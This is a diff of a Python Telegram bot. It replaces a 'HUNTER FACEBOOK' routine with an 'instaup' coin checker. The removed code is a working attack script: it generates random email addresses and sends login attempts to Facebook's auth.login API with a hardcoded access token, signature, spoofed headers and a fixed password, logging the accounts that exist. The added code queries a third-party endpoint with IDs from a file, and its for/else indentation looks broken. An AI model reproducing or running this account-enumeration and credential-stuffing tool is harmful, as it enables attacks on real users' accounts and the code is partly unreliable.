@@ -21,7 +21,7 @@ def boten(message):
     
     mas = types.InlineKeyboardMarkup(row_width=2)
     
-    A = types.InlineKeyboardButton(text ="HUNTER FACEBOOK", callback_data="F1")
+    A = types.InlineKeyboardButton(text ="coins instaup", callback_data="F1")
     
     E = types.InlineKeyboardButton(text ="CHECKER (IRAQ)", callback_data="F2")
     
@@ -42,7 +42,7 @@ def masg(call):
 		
 		mas = types.InlineKeyboardMarkup(row_width=2)
 		
-		A = types.InlineKeyboardButton(text ="HUNTER FACCEBOOK", callback_data="F1")
+		A = types.InlineKeyboardButton(text ="coins instaup", callback_data="F1")
 
 		E = types.InlineKeyboardButton(text ="CHECKER (IRAQ)", callback_data="F2")
 		
@@ -58,48 +58,29 @@ def masg(call):
 		ok=0
 		cp=0
 		sk=0
-		while True:
-			bs = str(''.join(random.choice(xm)for i in range(7))) 
-			bl = str(''.join(random.choice(xl)for i in range(1)))
-			email = str(bs)+'@'+str(bl)
-			user_agent = generate_user_agent()
-			headers = {
-            'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 
-            'x-fb-sim-hni': str(random.randint(20000, 40000)), 
-            'x-fb-net-hni': str(random.randint(20000, 40000)), 
-            'x-fb-connection-quality': 'EXCELLENT', 
-            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
-            'user-agent': user_agent, 
-            'content-type': 'application/x-www-form-urlencoded', 
-            'x-fb-http-engine': 'Liger'}
-			params = {
-            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
-            'format': 'JSON', 
-            'sdk_version': '2', 
-            'email': email, 
-            'locale': 'en_US', 
-            'password': '@t_4gi', 
-            'sdk': 'ios', 
-            'generate_session_cookies': '1', 
-            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
-			api = 'https://b-api.facebook.com/method/auth.login'
-			response = requests.get(api, params=params, headers=headers)
-			if str('The password you entered is incorrect. Please try again') in str(response.text):
+		file='done.txt'
+		for Whisper in open(file,'r').read().splitlines():
+			id=str(Whisper.split('\n')[0])
+			whisper = requests.get(f'https://cin.oussamavip.repl.co/?oid={id}&submit=submit').text
+			if 'coins":"' in whisper:
+				Whisper = whisper.split('coins":"')[1]
+				coin = Whisper.split('"')[0]
 				ok+=1
 				sk+=1
-				bot.send_message(call.message.chat.id,f"‹ ᴜѕᴇʀɴᴀᴍᴇ instagram  ✓\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : {email} \n────── • ✧✧ • ──────\n• @t_4gi")
+				if int(coin) > 400:
+					bot.send_message(call.message.chat.id,f"‹ [✓] {id} Coins ==> {coin} =====>• @t_4gi")
 				
-			else:
-				cp+=1
-				sk+=1
-				mas = types.InlineKeyboardMarkup(row_width=2)
-				A = types.InlineKeyboardButton(f'GOOD : {ok}',callback_data="1x")
-				E = types.InlineKeyboardButton(f'EROR : {cp}', callback_data="1x")
-				B = types.InlineKeyboardButton(f'{email}', callback_data="1x")
-				R = types.InlineKeyboardButton(f'{sk}', callback_data="1x")
-				M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
-				mas.add(A,E,B,R,M)
-				bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="ok start",reply_markup=mas)
+		else:
+			cp+=1
+			sk+=1
+			mas = types.InlineKeyboardMarkup(row_width=2)
+			A = types.InlineKeyboardButton(f'GOOD : {ok}',callback_data="1x")
+			E = types.InlineKeyboardButton(f'EROR : {cp}', callback_data="1x")
+			B = types.InlineKeyboardButton(f'{id}', callback_data="1x")
+			R = types.InlineKeyboardButton(f'{sk}', callback_data="1x")
+			M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
+			mas.add(A,E,B,R,M)
+			bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="ok start",reply_markup=mas)
 				
 			
 		
